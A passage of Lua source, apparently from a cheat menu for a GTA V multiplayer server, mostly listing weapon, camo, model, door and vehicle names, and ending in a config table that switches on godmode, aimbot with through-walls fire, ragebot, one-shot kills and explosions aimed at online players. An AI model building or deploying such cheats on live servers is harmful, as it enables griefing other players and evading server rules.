	{ "COMPONENT_PUMPSHOTGUN_MK2_CAMO", "Camo 1" },
	{ "COMPONENT_PUMPSHOTGUN_MK2_CAMO_02", "Camo 2" },
	{ "COMPONENT_PUMPSHOTGUN_MK2_CAMO_03", "Camo 3" },
	{ "COMPONENT_PUMPSHOTGUN_MK2_CAMO_04", "Camo 4" },
	{ "COMPONENT_PUMPSHOTGUN_MK2_CAMO_05", "Camo 5" },
	{ "COMPONENT_PUMPSHOTGUN_MK2_CAMO_06", "Camo 6" },
	{ "COMPONENT_PUMPSHOTGUN_MK2_CAMO_07", "Camo 7" },
	{ "COMPONENT_PUMPSHOTGUN_MK2_CAMO_08", "Camo 8" },
	{ "COMPONENT_PUMPSHOTGUN_MK2_CAMO_09", "Camo 9" },
	{ "COMPONENT_PUMPSHOTGUN_MK2_CAMO_10", "Camo 10" },
	{ "COMPONENT_PUMPSHOTGUN_MK2_CAMO_IND_01", "American Camo" },

	{ "COMPONENT_REVOLVER_MK2_CAMO", "Camo 1" },
	{ "COMPONENT_REVOLVER_MK2_CAMO_02", "Camo 2" },
	{ "COMPONENT_REVOLVER_MK2_CAMO_03", "Camo 3" },
	{ "COMPONENT_REVOLVER_MK2_CAMO_04", "Camo 4" },
	{ "COMPONENT_REVOLVER_MK2_CAMO_05", "Camo 5" },
	{ "COMPONENT_REVOLVER_MK2_CAMO_06", "Camo 6" },
	{ "COMPONENT_REVOLVER_MK2_CAMO_07", "Camo 7" },
	{ "COMPONENT_REVOLVER_MK2_CAMO_08", "Camo 8" },
	{ "COMPONENT_REVOLVER_MK2_CAMO_09", "Camo 9" },
	{ "COMPONENT_REVOLVER_MK2_CAMO_10", "Camo 10" },
	{ "COMPONENT_REVOLVER_MK2_CAMO_IND_01", "American Camo" },

	{ "COMPONENT_SPECIALCARBINE_MK2_CAMO", "Camo 1" },
	{ "COMPONENT_SPECIALCARBINE_MK2_CAMO_02", "Camo 2" },
	{ "COMPONENT_SPECIALCARBINE_MK2_CAMO_03", "Camo 3" },
	{ "COMPONENT_SPECIALCARBINE_MK2_CAMO_04", "Camo 4" },
	{ "COMPONENT_SPECIALCARBINE_MK2_CAMO_05", "Camo 5" },
	{ "COMPONENT_SPECIALCARBINE_MK2_CAMO_06", "Camo 6" },
	{ "COMPONENT_SPECIALCARBINE_MK2_CAMO_07", "Camo 7" },
	{ "COMPONENT_SPECIALCARBINE_MK2_CAMO_08", "Camo 8" },
	{ "COMPONENT_SPECIALCARBINE_MK2_CAMO_09", "Camo 9" },
	{ "COMPONENT_SPECIALCARBINE_MK2_CAMO_10", "Camo 10" },
	{ "COMPONENT_SPECIALCARBINE_MK2_CAMO_IND_01", "American Camo" },

	{ "COMPONENT_PISTOL_MK2_CAMO", "Camo 1" },
	{ "COMPONENT_SNSPISTOL_MK2_CAMO", "Camo 1" },
	{ "COMPONENT_SMG_MK2_CAMO", "Camo 1" },
	{ "COMPONENT_CARBINERIFLE_MK2_CAMO", "Camo 1" },
	{ "COMPONENT_ASSAULTRIFLE_MK2_CAMO", "Camo 1" },
	{ "COMPONENT_COMBATMG_MK2_CAMO", "Camo 1" },
	{ "COMPONENT_HEAVYSNIPER_MK2_CAMO", "Camo 1" },
	{ "COMPONENT_PISTOL_MK2_CAMO_02", "Camo 2" },
	{ "COMPONENT_SNSPISTOL_MK2_CAMO_02", "Camo 2" },
	{ "COMPONENT_CARBINERIFLE_MK2_CAMO_02", "Camo 2" },
	{ "COMPONENT_ASSAULTRIFLE_MK2_CAMO_02", "Camo 2" },
	{ "COMPONENT_SMG_MK2_CAMO_02", "Camo 2" },
	{ "COMPONENT_HEAVYSNIPER_MK2_CAMO_02", "Camo 2" },
	{ "COMPONENT_COMBATMG_MK2_CAMO_02", "Camo 2" },
	{ "COMPONENT_PISTOL_MK2_CAMO_03", "Camo 3" },
	{ "COMPONENT_SNSPISTOL_MK2_CAMO_03", "Camo 3" },
	{ "COMPONENT_HEAVYSNIPER_MK2_CAMO_03", "Camo 3" },
	{ "COMPONENT_CARBINERIFLE_MK2_CAMO_03", "Camo 3" },
	{ "COMPONENT_SMG_MK2_CAMO_03", "Camo 3" },
	{ "COMPONENT_COMBATMG_MK2_CAMO_03", "Camo 3" },
	{ "COMPONENT_ASSAULTRIFLE_MK2_CAMO_03", "Camo 3" },
	{ "COMPONENT_PISTOL_MK2_CAMO_04", "Camo 4" },
	{ "COMPONENT_SNSPISTOL_MK2_CAMO_04", "Camo 4" },
	{ "COMPONENT_CARBINERIFLE_MK2_CAMO_04", "Camo 4" },
	{ "COMPONENT_SMG_MK2_CAMO_04", "Camo 4" },
	{ "COMPONENT_COMBATMG_MK2_CAMO_04", "Camo 4" },
	{ "COMPONENT_HEAVYSNIPER_MK2_CAMO_04", "Camo 4" },
	{ "COMPONENT_ASSAULTRIFLE_MK2_CAMO_04", "Camo 4" },
	{ "COMPONENT_PISTOL_MK2_CAMO_05", "Camo 5" },
	{ "COMPONENT_SNSPISTOL_MK2_CAMO_05", "Camo 5" },
	{ "COMPONENT_SMG_MK2_CAMO_05", "Camo 5" },
	{ "COMPONENT_CARBINERIFLE_MK2_CAMO_05", "Camo 5" },
	{ "COMPONENT_HEAVYSNIPER_MK2_CAMO_05", "Camo 5" },
	{ "COMPONENT_ASSAULTRIFLE_MK2_CAMO_05", "Camo 5" },
	{ "COMPONENT_COMBATMG_MK2_CAMO_05", "Camo 5" },
	{ "COMPONENT_PISTOL_MK2_CAMO_06", "Camo 6" },
	{ "COMPONENT_SNSPISTOL_MK2_CAMO_06", "Camo 6" },
	{ "COMPONENT_ASSAULTRIFLE_MK2_CAMO_06", "Camo 6" },
	{ "COMPONENT_HEAVYSNIPER_MK2_CAMO_06", "Camo 6" },
	{ "COMPONENT_SMG_MK2_CAMO_06", "Camo 6" },
	{ "COMPONENT_CARBINERIFLE_MK2_CAMO_06", "Camo 6" },
	{ "COMPONENT_COMBATMG_MK2_CAMO_06", "Camo 6" },
	{ "COMPONENT_PISTOL_MK2_CAMO_07", "Camo 7" },
	{ "COMPONENT_SNSPISTOL_MK2_CAMO_07", "Camo 7" },
	{ "COMPONENT_CARBINERIFLE_MK2_CAMO_07", "Camo 7" },
	{ "COMPONENT_ASSAULTRIFLE_MK2_CAMO_07", "Camo 7" },
	{ "COMPONENT_COMBATMG_MK2_CAMO_07", "Camo 7" },
	{ "COMPONENT_HEAVYSNIPER_MK2_CAMO_07", "Camo 7" },
	{ "COMPONENT_SMG_MK2_CAMO_07", "Camo 7" },
	{ "COMPONENT_CARBINERIFLE_MK2_CAMO_08", "Camo 8" },
	{ "COMPONENT_PISTOL_MK2_CAMO_08", "Camo 8" },
	{ "COMPONENT_SNSPISTOL_MK2_CAMO_08", "Camo 8" },
	{ "COMPONENT_COMBATMG_MK2_CAMO_08", "Camo 8" },
	{ "COMPONENT_HEAVYSNIPER_MK2_CAMO_08", "Camo 8" },
	{ "COMPONENT_SMG_MK2_CAMO_08", "Camo 8" },
	{ "COMPONENT_ASSAULTRIFLE_MK2_CAMO_08", "Camo 8" },
	{ "COMPONENT_PISTOL_MK2_CAMO_09", "Camo 9" },
	{ "COMPONENT_SNSPISTOL_MK2_CAMO_09", "Camo 9" },
	{ "COMPONENT_COMBATMG_MK2_CAMO_09", "Camo 9" },
	{ "COMPONENT_CARBINERIFLE_MK2_CAMO_09", "Camo 9" },
	{ "COMPONENT_ASSAULTRIFLE_MK2_CAMO_09", "Camo 9" },
	{ "COMPONENT_HEAVYSNIPER_MK2_CAMO_09", "Camo 9" },
	{ "COMPONENT_SMG_MK2_CAMO_09", "Camo 9" },
	{ "COMPONENT_PISTOL_MK2_CAMO_10", "Camo 10" },
	{ "COMPONENT_SNSPISTOL_MK2_CAMO_10", "Camo 10" },
	{ "COMPONENT_ASSAULTRIFLE_MK2_CAMO_10", "Camo 10" },
	{ "COMPONENT_HEAVYSNIPER_MK2_CAMO_10", "Camo 10" },
	{ "COMPONENT_COMBATMG_MK2_CAMO_10", "Camo 10" },
	{ "COMPONENT_CARBINERIFLE_MK2_CAMO_10", "Camo 10" },
	{ "COMPONENT_SMG_MK2_CAMO_10", "Camo 10" },
	{ "COMPONENT_PISTOL_MK2_CAMO_IND_01", "American Camo" },
	{ "COMPONENT_SMG_MK2_CAMO_IND_01", "American Camo" },
	{ "COMPONENT_ASSAULTRIFLE_MK2_CAMO_IND_01", "American Camo" },
	{ "COMPONENT_CARBINERIFLE_MK2_CAMO_IND_01", "American Camo" },
	{ "COMPONENT_COMBATMG_MK2_CAMO_IND_01", "American Camo" },
	{ "COMPONENT_HEAVYSNIPER_MK2_CAMO_IND_01", "American Camo" },
	{ "COMPONENT_SNSPISTOL_MK2_CAMO_IND_01", "American Camo" },
}

local allWeapons = {
	"WEAPON_UNARMED",
	"WEAPON_KNIFE",
	"WEAPON_KNUCKLE",
	"WEAPON_NIGHTSTICK",
	"WEAPON_HAMMER",
	"WEAPON_BAT",
	"WEAPON_GOLFCLUB",
	"WEAPON_CROWBAR",
	"WEAPON_BOTTLE",
	"WEAPON_DAGGER",
	"WEAPON_HATCHET",
	"WEAPON_MACHETE",
	"WEAPON_FLASHLIGHT",
	"WEAPON_SWITCHBLADE",
	"WEAPON_PISTOL",
	"WEAPON_PISTOL_MK2",
	"WEAPON_COMBATPISTOL",
	"WEAPON_APPISTOL",
	"WEAPON_PISTOL50",
	"WEAPON_SNSPISTOL",
	"WEAPON_HEAVYPISTOL",
	"WEAPON_VINTAGEPISTOL",
	"WEAPON_STUNGUN",
	"WEAPON_FLAREGUN",
	"WEAPON_MARKSMANPISTOL",
	"WEAPON_REVOLVER",
	"WEAPON_REVOLVER_MK2",
	"WEAPON_MICROSMG",
	"WEAPON_SMG",
	"WEAPON_SMG_MK2",
	"WEAPON_ASSAULTSMG",
	"WEAPON_MG",
	"WEAPON_COMBATMG",
	"WEAPON_COMBATMG_MK2",
	"WEAPON_COMBATPDW",
	"WEAPON_GUSENBERG",
	"WEAPON_MACHINEPISTOL",
	"WEAPON_ASSAULTRIFLE",
	"WEAPON_ASSAULTRIFLE_MK2",
	"WEAPON_CARBINERIFLE",
	"WEAPON_CARBINERIFLE_MK2",
	"WEAPON_ADVANCEDRIFLE",
	"WEAPON_SPECIALCARBINE",
	"WEAPON_BULLPUPRIFLE",
	"WEAPON_COMPACTRIFLE",
	"WEAPON_PUMPSHOTGUN",
	"WEAPON_SAWNOFFSHOTGUN",
	"WEAPON_BULLPUPSHOTGUN",
	"WEAPON_ASSAULTSHOTGUN",
	"WEAPON_MUSKET",
	"WEAPON_HEAVYSHOTGUN",
	"WEAPON_DBSHOTGUN",
	"WEAPON_SNIPERRIFLE",
	"WEAPON_HEAVYSNIPER",
	"WEAPON_HEAVYSNIPER_MK2",
	"WEAPON_MARKSMANRIFLE",
	"WEAPON_GRENADELAUNCHER",
	"WEAPON_GRENADELAUNCHER_SMOKE",
	"WEAPON_RPG",
	"WEAPON_MINIGUN",
	"WEAPON_STINGER",
	"WEAPON_FIREWORK",
	"WEAPON_HOMINGLAUNCHER",
	"WEAPON_GRENADE",
	"WEAPON_STICKYBOMB",
	"WEAPON_PROXMINE",
	"WEAPON_BZGAS",
	"WEAPON_SMOKEGRENADE",
	"WEAPON_MOLOTOV",
	"WEAPON_FIREEXTINGUISHER",
	"WEAPON_PETROLCAN",
	"WEAPON_FLARE",
	"WEAPON_RAYPISTOL",
	"WEAPON_RAYCARBINE",
	"WEAPON_RAYMINIGUN",
	"WEAPON_STONE_HATCHET",
	"WEAPON_BATTLEAXE",
	"GADGET_PARACHUTE",
}

local PlayerModels = {
	"mp_m_freemode_01",
	"a_m_m_acult_01",
	"a_m_m_afriamer_01",
	"a_m_m_beach_01",
	"a_m_m_beach_02",
	"a_m_m_bevhills_01",
	"a_m_m_bevhills_02",
	"a_m_m_business_01",
	"a_m_m_eastsa_01",
	"a_m_m_eastsa_02",
	"a_m_m_farmer_01",
	"a_m_m_fatlatin_01",
	"a_m_m_genfat_01",
	"a_m_m_genfat_02",
	"a_m_m_golfer_01",
	"a_m_m_hasjew_01",
	"a_m_m_hillbilly_01",
	"a_m_m_hillbilly_02",
	"a_m_m_indian_01",
	"a_m_m_ktown_01",
	"a_m_m_malibu_01",
	"a_m_m_mexcntry_01",
	"a_m_m_mexlabor_01",
	"a_m_m_og_boss_01",
	"a_m_m_paparazzi_01",
	"a_m_m_polynesian_01",
	"a_m_m_prolhost_01",
	"a_m_m_rurmeth_01",
	"a_m_m_salton_01",
	"a_m_m_salton_02",
	"a_m_m_salton_03",
	"a_m_m_salton_04",
	"a_m_m_skater_01",
	"a_m_m_skidrow_01",
	"a_m_m_socenlat_01",
	"a_m_m_soucent_01",
	"a_m_m_soucent_02",
	"a_m_m_soucent_03",
	"a_m_m_soucent_04",
	"a_m_m_stlat_02",
	"a_m_m_tennis_01",
	"a_m_m_tourist_01",
	"a_m_m_tramp_01",
	"a_m_m_trampbeac_01",
	"a_m_m_tranvest_01",
	"a_m_m_tranvest_02",
	"a_m_o_acult_01",
	"a_m_o_acult_02",
	"a_m_o_beach_01",
	"a_m_o_genstreet_01",
	"a_m_o_ktown_01",
	"a_m_o_salton_01",
	"a_m_o_soucent_01",
	"a_m_o_soucent_02",
	"a_m_o_soucent_03",
	"SKIN MOD",
	"BabyCaioG",
	"BabyFloraG",
	"BabyHenryG",
	"BabySolG",
	"lotus",
	"Panda_Booyahday",
	"skin_baby",
	"Sully",
	"Panda4",
	"elsa",
	"abirdred",
	"chucky",
	"Vanellope",
	"TravisScott",
	"babyboy1",
	"babygirl1",
	"DaisyDuck",
	"Donald_Duck",
	"sonicboom",
	"arneer",
	"klee",
	"kawaikidgirl53",
	"FaytGroomSOA",
	"Sally",
	"dstrange",
	"Baby_kitana",
	"Baby_Milena",
	"Baby_Sonia",
	"LiuKang_baby",
	"a_m_y_jetski_01",
	"a_m_y_juggalo_01",
	"a_m_y_ktown_01",
	"a_m_y_ktown_02",
	"a_m_y_latino_01",
	"TanjiroKamada",
	"AkitaNeru",
	"midoriya_rh7",
	"ShigeoKageyama",
	"Bluefriend",
	"Puss",
	"Brian",
	"EvelysseSOA",
	"Conan_D"
}

local DoorPropNames = {
	"v_ilev_shrfdoor",
	"v_ilev_ph_gendoor004",
	"prop_faceoffice_door_l",
	"v_ilev_ct_door03",
	"v_ilev_ml_door1",
	"v_ilev_ss_door04",
	"v_ilev_ss_doorext",
	"v_ilev_methdoorscuff",
	"v_ilev_fibl_door01",
	"v_ilev_fibl_door02",
	"v_ilev_fib_doore_l",
	"v_ilev_fib_doore_r",
	"v_ilev_csr_door_l",
	"v_ilev_csr_door_r",
	"v_ilev_fib_door1",
	"apa_prop_ss1_mpint_door_l",
	"apa_prop_ss1_mpint_door_r",
	"v_ilev_roc_door4",
	"v_ilev_roc_door1_l",
	"v_ilev_roc_door1_r",
	"v_ilev_roc_door2",
	"prop_strip_door_01",
	"v_ilev_door_orange",
	"v_ilev_door_orangesolid",
	"v_ilev_247door",
	"v_ilev_247door_r",
	"v_ilev_mldoor2"
}

local spawninsidevehicle = false
local CustomSpawnColour = false
local defaultvehcolor = { 0, 0, 0 }
local VehicleList = {
    Catagories = {
		"Boats",
		"Commercial",
		"Compacts",
		"Coupes",
		"Cycles",
		"Emergency",
		"Helictopers",
		"Industrial",
		"Military",
		"Motorcycles",
		"Muscle",
		"Off-Road",
		"Planes",
		"SUVs",
		"Sedans",
		"Service",
		"Sports",
		"Sports Classic",
		"Super",
		"Trailer",
		"Trains",
		"Utility",
		"Vans"
	},
	Boats = {
		"Dinghy",
		"Dinghy2",
		"Dinghy3",
		"Dingh4",
		"Jetmax",
		"Marquis",
		"Seashark",
		"Seashark2",
		"Seashark3",
		"Speeder",
		"Speeder2",
		"Squalo",
		"Submersible",
		"Submersible2",
		"Suntrap",
		"Toro",
		"Toro2",
		"Tropic",
		"Tropic2",
		"Tug"
	},
    Commercial = {
		"Benson",
		"Biff",
		"Cerberus",
		"Cerberus2",
		"Cerberus3",
        "Hauler",
        "Hauler2",
        "Mule",
        "Mule2",
        "Mule3",
		"Mule4",
        "Packer",
        "Phantom",
		"Phantom2",
        "Phantom3",
        "Pounder",
        "Pounder2",
        "Stockade",
        "Stockade3",
        "Terbyte"
	},
	Compacts = {
		"Blista",
		"Blista2",
		"Blista3",
		"Brioso",
		"Dilettante",
		"Dilettante2",
		"Issi2",
		"Issi3",
		"issi4",
		"Iss5",
		"issi6",
		"Panto",
		"Prarire",
		"Rhapsody"
	},
	Coupes = {
		"CogCabrio",
		"Exemplar",
		"F620",
		"Felon",
		"Felon2",
		"Jackal",
		"Oracle",
		"Oracle2",
		"Sentinel",
		"Sentinel2",
		"Windsor",
		"Windsor2",
		"Zion",
		"Zion2"
	},
	Cycles = {
		"Bmx", 
		"Cruiser", 
		"Fixter", 
		"Scorcher", 
		"Tribike", 
		"Tribike2", 
		"tribike3"
	},
	Emergency = {
		"AMBULANCE",
		"FBI",
		"FBI2",
		"FireTruk",
		"PBus",
		"police",
		"Police2",
		"Police3",
		"Police4",
		"PoliceOld1",
		"PoliceOld2",
		"PoliceT",
		"Policeb",
		"Polmav",
		"Pranger",
		"Predator",
		"Riot",
		"Riot2",
		"Sheriff",
		"Sheriff2"
	},
	Helictopers = {
		"Akula",
		"Annihilator",
		"Buzzard",
		"Buzzard2",
		"Cargobob",
		"Cargobob2",
		"Cargobob3",
		"Cargobob4",
		"Frogger",
		"Frogger2",
		"Havok",
		"Hunter",
		"Maverick",
		"Savage",
		"Seasparrow",
		"Skylift",
		"Supervolito",
		"Supervolito2",
		"Swift",
		"Swift2",
		"Valkyrie",
		"Valkyrie2",
		"Volatus"
	},
	Industrial = {
		"Bulldozer",
		"Cutter",
		"Dump",
		"Flatbed",
		"Guardian",
		"Handler",
		"Mixer",
		"Mixer2",
		"Rubble",
		"Tiptruck",
		"Tiptruck2"
	},
	Military = {
		"APC",
		"Barracks",
		"Barracks2",
		"Barracks3",
		"Barrage",
		"Chernobog",
		"Crusader",
		"Halftrack",
		"Khanjali",
		"Rhino",
		"Scarab",
		"Scarab2",
		"Scarab3",
		"Thruster",
		"Trailersmall2"
	},
	Motorcycles = {
		"Akuma",
		"Avarus",
		"Bagger",
		"Bati2",
		"Bati",
		"BF400",
		"Blazer4",
		"CarbonRS",
		"Chimera",
		"Cliffhanger",
		"Daemon",
		"Daemon2",
		"Defiler",
		"Deathbike",
		"Deathbike2",
		"Deathbike3",
		"Diablous",
		"Diablous2",
		"Double",
		"Enduro",
		"esskey",
		"Faggio2",
		"Faggio3",
		"Faggio",
		"Fcr2",
		"fcr",
		"gargoyle",
		"hakuchou2",
		"hakuchou",
		"hexer",
		"innovation",
		"Lectro",
		"Manchez",
		"Nemesis",
		"Nightblade",
		"Oppressor",
		"Oppressor2",
		"PCJ",
		"Ratbike",
		"Ruffian",
		"Sanchez2",
		"Sanchez",
		"Sanctus",
		"Shotaro",
		"Sovereign",
		"Thrust",
		"Vader",
		"Vindicator",
		"Vortex",
		"Wolfsbane",
		"zombiea",
		"zombieb"
	},
	Muscle = {
		"Blade",
		"Buccaneer",
		"Buccaneer2",
		"Chino",
		"Chino2",
		"clique",
		"Deviant",
		"Dominator",
		"Dominator2",
		"Dominator3",
		"Dominator4",
		"Dominator5",
		"Dominator6",
		"Dukes",
		"Dukes2",
		"Ellie",
		"Faction",
		"faction2",
		"faction3",
		"Gauntlet",
		"Gauntlet2",
		"Hermes",
		"Hotknife",
		"Hustler",
		"Impaler",
		"Impaler2",
		"Impaler3",
		"Impaler4",
		"Imperator",
		"Imperator2",
		"Imperator3",
		"Lurcher",
		"Moonbeam",
		"Moonbeam2",
		"Nightshade",
		"Phoenix",
		"Picador",
		"RatLoader",
		"RatLoader2",
		"Ruiner",
		"Ruiner2",
		"Ruiner3",
		"SabreGT",
		"SabreGT2",
		"Sadler2",
		"Slamvan",
		"Slamvan2",
		"Slamvan3",
		"Slamvan4",
		"Slamvan5",
		"Slamvan6",
		"Stalion",
		"Stalion2",
		"Tampa",
		"Tampa3",
		"Tulip",
		"Vamos,",
		"Vigero",
		"Virgo",
		"Virgo2",
		"Virgo3",
		"Voodoo",
		"Voodoo2",
		"Yosemite"
	},
	Off_Road = {
		"BFinjection",
		"Bifta",
		"Blazer",
		"Blazer2",
		"Blazer3",
		"Blazer5",
		"Bohdi",
		"Brawler",
		"Bruiser",
		"Bruiser2",
		"Bruiser3",
		"Caracara",
		"DLoader",
		"Dune",
		"Dune2",
		"Dune3",
		"Dune4",
		"Dune5",
		"Insurgent",
		"Insurgent2",
		"Insurgent3",
		"Kalahari",
		"Kamacho",
		"LGuard",
		"Marshall",
		"Mesa",
		"Mesa2",
		"Mesa3",
		"Monster",
		"Monster4",
		"Monster5",
		"Nightshark",
		"RancherXL",
		"RancherXL2",
		"Rebel",
		"Rebel2",
		"RCBandito",
		"Riata",
		"Sandking",
		"Sandking2",
		"Technical",
		"Technical2",
		"Technical3",
		"TrophyTruck",
		"TrophyTruck2",
		"Freecrawler",
		"Menacer"
	},
	Planes = {
		"AlphaZ1",
		"Avenger",
		"Avenger2",
		"Besra",
		"Blimp",
		"blimp2",
		"Blimp3",
		"Bombushka",
		"Cargoplane",
		"Cuban800",
		"Dodo",
		"Duster",
		"Howard",
		"Hydra",
		"Jet",
		"Lazer",
		"Luxor",
		"Luxor2",
		"Mammatus",
		"Microlight",
		"Miljet",
		"Mogul",
		"Molotok",
		"Nimbus",
		"Nokota",
		"Pyro",
		"Rogue",
		"Seabreeze",
		"Shamal",
		"Starling",
		"Stunt",
		"Titan",
		"Tula",
		"Velum",
		"Velum2",
		"Vestra",
		"Volatol",
		"Striekforce"
	},
	SUVs = {
		"BJXL",
		"Baller",
		"Baller2",
		"Baller3",
		"Baller4",
		"Baller5",
		"Baller6",
		"Cavalcade",
		"Cavalcade2",
		"Dubsta",
		"Dubsta2",
		"Dubsta3",
		"FQ2",
		"Granger",
		"Gresley",
		"Habanero",
		"Huntley",
		"Landstalker",
		"patriot",
		"Patriot2",
		"Radi",
		"Rocoto",
		"Seminole",
		"Serrano",
		"Toros",
		"XLS",
		"XLS2"
	},
	Sedans = {
		"Asea",
		"Asea2",
		"Asterope",
		"Cog55",
		"Cogg552",
		"Cognoscenti",
		"Cognoscenti2",
		"emperor",
		"emperor2",
		"emperor3",
		"Fugitive",
		"Glendale",
		"ingot",
		"intruder",
		"limo2",
		"premier",
		"primo",
		"primo2",
		"regina",
		"romero",
		"stafford",
		"Stanier",
		"stratum",
		"stretch",
		"surge",
		"tailgater",
		"warrener",
		"Washington"
	},
	Service = {
		"Airbus",
		"Brickade",
		"Bus",
		"Coach",
		"Rallytruck",
		"Rentalbus",
		"taxi",
		"Tourbus",
		"Trash",
		"Trash2",
		"WastIndr",
		"PBus2"
	},
	Sports = {
		"Alpha",
		"Banshee",
		"Banshee2",
		"BestiaGTS",
		"Buffalo",
		"Buffalo2",
		"Buffalo3",
		"Carbonizzare",
		"Comet2",
		"Comet3",
		"Comet4",
		"Comet5",
		"Coquette",
		"Deveste",
		"Elegy2",
		"Feltzer2",
		"Feltzer3",
		"FlashGT",
		"Furoregt",
		"Fusilade",
		"Futo",
		"GB200",
		"Hotring",
		"Infernus2",
		"Italigto",
		"Jester",
		"Jester2",
		"Khamelion",
		"Kurama",
		"Kurama2",
		"Lynx",
		"MAssacro",
		"MAssacro2",
		"neon",
		"Ninef",
		"ninfe2",
		"omnis",
		"Pariah",
		"Penumbra",
		"Raiden",
		"RapidGT",
		"RapidGT2",
		"Raptor",
		"Revolter",
		"Ruston",
		"Schafter2",
		"Schafter3",
		"Schafter4",
		"Schafter5",
		"Schafter6",
		"Schlagen",
		"Schwarzer",
		"Sentinel3",
		"Seven70",
		"Specter",
		"Specter2",
		"Streiter",
		"Sultan",
		"Surano",
		"Tampa2",
		"Tropos",
		"Verlierer2",
		"ZR380"
	},
	Sports_Classic = {
		"Ardent",
		"BType",
		"BType2",
		"BType3",
		"Casco",
		"Cheetah2",
		"Cheburek",
		"Coquette2",
		"Coquette3",
		"Deluxo",
		"Fagaloa",
		"Gt500",
		"JB700",
		"Jester3",
		"MAmba",
		"Manana",
		"Michelli",
		"Monroe",
		"Peyote",
		"Pigalle",
		"RapidGT3",
		"Retinue",
		"Savestra",
		"Stinger",
		"Stingergt",
		"Stromberg",
		"Swinger",
		"Torero",
		"Tornado",
		"Tornado2",
		"Tornado3",
		"Tornado4",
		"Tornado5",
		"Tornado6",
		"Viseris",
		"Z190",
		"ZType"
	},
	Super = {
		"Adder",
		"Autarch",
		"Bullet",
		"Cheetah",
		"Cyclone",
		"Elegy",
		"EntityXF",
		"Entity2",
		"FMJ",
		"GP1",
		"Infernus",
		"LE7B",
		"Nero",
		"Nero2",
		"Osiris",
		"Penetrator",
		"PFister811",
		"Prototipo",
		"Reaper",
		"SC1",
		"Scramjet",
		"Sheava",
		"SultanRS",
		"Superd",
		"T20",
		"Taipan",
		"Tempesta",
		"Tezeract",
		"Turismo2",
		"Turismor",
		"Tyrant",
		"Tyrus",
		"Vacca",
		"Vagner",
		"Vigilante",
		"Visione",
		"Voltic",
		"Voltic2",
		"Zentorno",
		"Italigtb",
		"Italigtb2",
		"XA21"
	},
	Trailer = {
		"ArmyTanker",
		"ArmyTrailer",
		"ArmyTrailer2",
		"BaleTrailer",
		"BoatTrailer",
		"CableCar",
		"DockTrailer",
		"Graintrailer",
		"Proptrailer",
		"Raketailer",
		"TR2",
		"TR3",
		"TR4",
		"TRFlat",
		"TVTrailer",
		"Tanker",
		"Tanker2",
		"Trailerlogs",
		"Trailersmall",
		"Trailers",
		"Trailers2",
		"Trailers3"
	},
	Trains = {
		"Freight",
		"Freightcar",
		"Freightcont1",
		"Freightcont2",
		"Freightgrain",
		"Freighttrailer",
		"TankerCar"
	},
	Utility = {
		"Airtug",
		"Caddy",
		"Caddy2",
		"Caddy3",
		"Docktug",
		"Forklift",
		"Mower",
		"Ripley",
		"Sadler",
		"Scrap",
		"TowTruck",
		"Towtruck2",
		"Tractor",
		"Tractor2",
		"Tractor3",
		"TrailerLArge2",
		"Utilitruck",
		"Utilitruck3",
		"Utilitruck2"
	},
	Vans = {
		"Bison",
		"Bison2",
		"Bison3",
		"BobcatXL",
		"Boxville",
		"Boxville2",
		"Boxville3",
		"Boxville4",
		"Boxville5",
		"Burrito",
		"Burrito2",
		"Burrito3",
		"Burrito4",
		"Burrito5",
		"Camper",
		"GBurrito",
		"GBurrito2",
		"Journey",
		"Minivan",
		"Minivan2",
		"Paradise",
		"pony",
		"Pony2",
		"Rumpo",
		"Rumpo2",
		"Rumpo3",
		"Speedo",
		"Speedo2",
		"Speedo4",
		"Surfer",
		"Surfer2",
		"Taco",
		"Youga",
		"youga2"
	}
}

-------- Menu Config --------

local killmenu = false

local HydroVariables = {
	SelfOptions = {
		Wardrobe = {
			Head = 0,
			Mask = 0,
		},
		AlienColorSpam = false,
		invisiblitity = false,
		godmode = false,
		AutoHealthRefil = false,
		AntiHeadshot = false,
		MoonWalk = false,
		InfiniteCombatRoll = false,
		superjump = false,
		superrun = false,
		infstamina = false,
		FreezeWantedLevel = false,
		noragdoll = false,
		disableobjectcollisions = false,
		disablepedcollisions = false,
		disablevehiclecollisions = false,
		forceradar = false,
		playercoords = false
	},
	VehicleOptions = {
		AutoPilotOptions = {
			DrivingStyles = {"Avoid Traffic Extremely", "Sometimes Overtake Traffic", "Rushed", "Normal", "Ignore Lights", "Avoid Traffic"},
			CruiseSpeed = 50.0,
			DrivingStyle = 6,
			SelCruiseSpeedIndex = 1,
			CurCruiseSpeedIndex = 1,
		},
		SelDoorPV = 1,
		CurDoorPV = 1,
		SelCloseDoorPV = 1,
		CurCloseDoorPV = 1,
		AutoClean = false,
		vehgodmode = false,
		speedboost = false,
		Waterproof = false,
		InstantBreaks = false,
		Hydroplate = false,
		rainbowcar = false,
		speedometer = false,
		EasyHandling = false,
		DriveOnWater = false,
		AlwaysWheelie = false,
		PersonalVehicle = false,
		forcelauncontrol = false,
		activetorquemulr = false,
		activeenignemulr = false,
		PersonalVehicleESP = false,
		PersonalVehicleCam = false,
		PersonalVehicleMarker = false,
		vehenginemultiplier = { "x2", "x4", "x8", "x16", "x32", "x64", "x128", "x256", "x512", "x1024" },
		selactivetorqueIndex = 1,
		curractivetorqueIndex = 1,
		selactiveenignemulrIndex = 1,
		curractiveenignemulrIndex = 1
	},
	TeleportOptions = {
		smoothteleport = false,
		teleportlocations = {
			{"Mission Row PD", 440.22, -982.21, 30.69},
			{"Sandy Shores PD", 1857.48, 3677.88, 33.73},
			{"Paleto Bay PD", -434.34, 6020.89, 31.50}
		}
	},
	WeaponOptions = {
		BulletOptions = {
			Enabled = false,
			Bullets = { "Revolver", "Heavy Sniper", "RPG", "Firework Launcher", "Ray Pistol" },
			CurrentBullet = 1,
			WeaponBulletName = "WEAPON_REVOLVER",
		},
		BulletToUse = "WEAPON_HEAVYSNIPER",
		ExplosiveAmmo = false,
		TriggerBot = false,
		RapidFire = false,
		Crosshair = false, 
		DelGun = false,
		AimBot = {
			Targeting = {
				Target = nil,
				LowestResult = { x = 1.0, y = 1.0}
			},
			ComboBox = {
				SelIndex = 1,
				CurIndex = 1,
				IndexItems = { "Head", "Chest", "Pelvis" },
			},
			MultiTarget = 1,
			Target = nil,
			Enabled = false,
			Bone = "SKEL_HEAD",
			HitChance = 100,
			ThroughWalls = false,
			DrawFOV = true,
			ShowTarget = false,
			FOV = 0.50,
			OnlyPlayers = false,
			IgnoreFriends = true,
			Distance = 1000.0,
			InvisibilityCheck = true,
		},
		NoRecoil = false,
		Tracers = false,
		RageBot = false,
		Spinbot = false,
		InfAmmo = false,
		NoReload = false,
		OneShot = false
	},
	OnlinePlayer = {
		ExplosionType = 1,
